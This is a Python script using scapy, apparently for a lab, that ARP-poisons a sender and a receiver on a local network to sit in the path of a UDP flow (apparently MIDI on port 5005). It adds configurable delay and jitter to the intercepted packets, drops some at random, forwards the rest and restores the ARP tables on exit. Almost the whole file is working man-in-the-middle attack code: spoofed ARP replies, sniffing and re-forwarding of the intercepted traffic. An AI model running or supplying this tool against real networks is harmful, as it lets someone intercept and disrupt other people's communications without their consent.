#!/usr/bin/env python3
"""
mitm_delay.py

Simple lab MITM delay inserter.

Usage example (run on attacker machine, as root):
  sudo python3 mitm_delay.py --iface eth0 --sender 10.0.0.10 --receiver 10.0.0.181 \
    --port 5005 --delay-ms 120 --jitter-ms 30 --drop-pct 0

This ARP-poisons sender and receiver so attacker sits in-path, delays UDP packets
on the chosen port, and forwards them. Ctrl-C restores ARP tables.
"""

import argparse, threading, time, random, sys, signal
from scapy.all import (
    ARP, Ether, IP, UDP, Raw,
    send, sendp, srp, sniff, get_if_hwaddr, conf, getmacbyip
)

conf.verb = 0

def parse_args():
    p = argparse.ArgumentParser(description="MITM delay proxy for UDP flow (lab use only).")
    p.add_argument("--iface", required=True, help="Interface to use (attacker).")
    p.add_argument("--sender", required=True, help="Sender IP (origin of MIDI).")
    p.add_argument("--receiver", required=True, help="Receiver IP (destination).")
    p.add_argument("--port", type=int, default=5005, help="UDP port to target (default 5005).")
    p.add_argument("--delay-ms", type=float, default=100.0, help="Base delay in ms.")
    p.add_argument("--jitter-ms", type=float, default=0.0, help="Max jitter +- ms.")
    p.add_argument("--drop-pct", type=float, default=0.0, help="Random drop percent (0-100).")
    return p.parse_args()

def get_mac(ip, iface):
    mac = getmacbyip(ip)
    if mac is None:
        # try an ARP ping
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, retry=1)
        for _, r in ans:
            return r[Ether].src
    return mac

def arp_poison_thread(iface, target_ip, spoof_ip, target_mac, attacker_mac, stop_event):
    # repeatedly send gratuitous ARP replies to poison the target
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=attacker_mac, hwdst=target_mac)
    while not stop_event.is_set():
        send(arp, iface=iface, verbose=False)
        time.sleep(1.0)

def restore_arp(iface, target_ip, real_mac, spoof_ip):
    # send correct mapping to repair ARP (multiple times)
    pkt = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=real_mac, hwdst="ff:ff:ff:ff:ff:ff")
    for _ in range(5):
        send(pkt, iface=iface, verbose=False)
        time.sleep(0.2)

def packet_handler_factory(args, attacker_mac, sender_mac, receiver_mac, stop_event):
    def handler(pkt):
        if stop_event.is_set():
            return

        # only handle IP/UDP packets
        if not (IP in pkt and UDP in pkt):
            return

        ip = pkt[IP]
        udp = pkt[UDP]

        # only target the chosen port and the two endpoints
        if udp.dport == args.port and ip.src == args.sender and ip.dst == args.receiver:
            # decide drop
            if args.drop_pct > 0 and random.random() < (args.drop_pct / 100.0):
                # drop: do nothing (simulates packet loss)
                # optional: log
                print(f"[drop] {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport} seq? size {len(pkt)}")
                return

            jitter = random.uniform(-args.jitter_ms, args.jitter_ms) if args.jitter_ms > 0 else 0
            delay = max(0.0, args.delay_ms + jitter) / 1000.0
            # for small delays, sleeping in handler is okay for a demo. For higher throughput use a queue+worker.
            time.sleep(delay)

            # rebuild Ethernet/IP/UDP with proper dst MAC to send onto receiver
            payload = bytes(udp.payload) if Raw in udp or len(udp.payload) > 0 else b""
            newpkt = Ether(src=attacker_mac, dst=receiver_mac) / IP(src=ip.src, dst=ip.dst, ttl=ip.ttl) / UDP(sport=udp.sport, dport=udp.dport) / Raw(load=payload)
            sendp(newpkt, iface=args.iface, verbose=False)
            print(f"[fwd->R] delayed {int(delay*1000)}ms {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport}")

        elif udp.dport == args.port and ip.src == args.receiver and ip.dst == args.sender:
            # packets from receiver back to sender (e.g. ACKs)
            if args.drop_pct > 0 and random.random() < (args.drop_pct / 100.0):
                print(f"[drop] reply {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport}")
                return

            jitter = random.uniform(-args.jitter_ms, args.jitter_ms) if args.jitter_ms > 0 else 0
            delay = max(0.0, args.delay_ms + jitter) / 1000.0
            time.sleep(delay)

            payload = bytes(udp.payload) if Raw in udp or len(udp.payload) > 0 else b""
            newpkt = Ether(src=attacker_mac, dst=sender_mac) / IP(src=ip.src, dst=ip.dst, ttl=ip.ttl) / UDP(sport=udp.sport, dport=udp.dport) / Raw(load=payload)
            sendp(newpkt, iface=args.iface, verbose=False)
            print(f"[fwd->S] delayed {int(delay*1000)}ms {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport}")

        else:
            # not the flow we care about; optionally forward without delay by doing nothing (the kernel will handle forwarding),
            # but since we've ARP-poisoned both ends, packets will arrive to us and we must forward them.
            # For safety we only touch the targeted flow; other traffic we forward immediately:
            try:
                # if Ethernet present, forward it to the correct destination MAC based on IP
                if ip.dst == args.receiver:
                    dst_mac = receiver_mac
                elif ip.dst == args.sender:
                    dst_mac = sender_mac
                else:
                    # unknown destination — let kernel decide (we won't alter)
                    return
                # maintain payload
                payload = bytes(ip.payload)
                newpkt = Ether(src=attacker_mac, dst=dst_mac) / ip.__class__(bytes(ip))
                sendp(newpkt, iface=args.iface, verbose=False)
            except Exception:
                pass

    return handler

def main():
    args = parse_args()
    iface = args.iface

    attacker_mac = get_if_hwaddr(iface)
    sender_mac = get_mac(args.sender, iface)
    receiver_mac = get_mac(args.receiver, iface)

    if sender_mac is None or receiver_mac is None:
        print("Could not resolve sender or receiver MAC — ensure they are reachable on LAN.")
        sys.exit(1)

    print(f"Attacker MAC: {attacker_mac}")
    print(f"Sender {args.sender} MAC: {sender_mac}")
    print(f"Receiver {args.receiver} MAC: {receiver_mac}")

    stop_event = threading.Event()

    # start ARP poisoners: tell sender that receiver IP is at attacker's MAC, and tell receiver that sender IP is at attacker's MAC
    t1 = threading.Thread(target=arp_poison_thread, args=(iface, args.sender, args.receiver, sender_mac, attacker_mac, stop_event), daemon=True)
    t2 = threading.Thread(target=arp_poison_thread, args=(iface, args.receiver, args.sender, receiver_mac, attacker_mac, stop_event), daemon=True)
    t1.start(); t2.start()

    print("ARP poison threads started. Traffic between sender and receiver should now go through this host.")
    print("Beginning packet sniffing/forwarding. Ctrl-C to stop and restore ARP.")

    handler = packet_handler_factory(args, attacker_mac, sender_mac, receiver_mac, stop_event)

    def stop_and_restore(signalnum, frame):
        print("\nStopping... restoring ARP.")
        stop_event.set()
        # send correct ARP to both endpoints to restore
        restore_arp(iface, args.sender, sender_mac, args.receiver)
        restore_arp(iface, args.receiver, receiver_mac, args.sender)
        time.sleep(1.0)
        sys.exit(0)

    signal.signal(signal.SIGINT, stop_and_restore)

    # sniff for IP packets on the interface; we need to capture full Ethernet frames
    sniff(iface=iface, prn=handler, store=0, filter=f"udp port {args.port} or ip host {args.sender} or ip host {args.receiver}")

if __name__ == "__main__":
    main()